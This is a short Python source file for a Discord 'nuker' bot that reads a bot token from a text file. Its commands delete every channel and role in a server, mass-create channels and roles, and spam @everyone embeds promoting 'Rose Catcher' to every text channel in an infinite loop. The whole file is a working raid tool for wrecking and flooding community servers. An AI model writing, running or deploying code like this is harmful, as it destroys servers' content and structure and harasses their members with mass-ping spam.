import discord
import time
import os
import sys
from discord.ext import commands

f = open("tokens.txt")
x = f.readline()


bot = commands.Bot(command_prefix="/")
@bot.event
async def on_ready():
	os.system("clear")
	print(f"\033[32mcontinue Bot {bot.user}")
	print("")
	print("")
	print("")
	
@bot.command()
async def create_channel(ctx,message,jam:int):
	m = message
	for i in range(jam):
		await ctx.message.guild.create_text_channel(message)
		print(f"\033[1;90m[!] \033[1;91mCREATE CHANNEL \033[1;90m| \033[1;92m{m}")
		
@bot.command()
async def delete_channel(ctx):
	for c in ctx.guild.channels:
		await c.delete()
		channel_id = c.id
		print(f"\033[1;90m[!] \033[1;91mDELETE CHANNEL \033[1;90m| \033[1;92m{channel_id}")
		
@bot.command()
async def create_role(ctx,name,jam:int):
	n = name
	for i in range(jam):
		guild = ctx.guild
		await guild.create_role(name=name)
		print(f"\033[1;90m[!] \033[1;91mCREATE ROLE \033[1;90m| \033[1;92m{n}")
		
@bot.command()
async def delete_role(ctx):
	for c in ctx.guild.roles:
		try:
			await c.delete()
			r = c.name
			print(f"\033[1;90m[!] \033[1;91mDELETE ROLE \033[1;90m| \033[1;92m{r}")
		except:
			pass
			
@bot.command()
async def webhooks_spam(ctx):
	while True:
		for channel in ctx.guild.text_channels:
			emBed = discord.Embed(title="Webhooks Spammer",description="Rose Catcher",color=0xff4612)
			emBed.add_field(name='Webhooks ',value='@everyone Rose Catcher Number.one Thailand! ')
			ima = "https://images-ext-2.discordapp.net/external/UCsINj_6Pmtw7ulMUCxTriy3Z5ZiRitfYvhthHR2Yyc/https/c.tenor.com/HFuObLngNWsAAAAC/email-notification.gif"
			emBed.set_image(url=ima)
			await channel.send("@everyone", embed=emBed)
			b = channel.id
			print(f"\033[1;90m[!] \033[1;91mWEBHOOKS SPAM \033[1;90m| \033[32m{b}")
		
bot.run(x)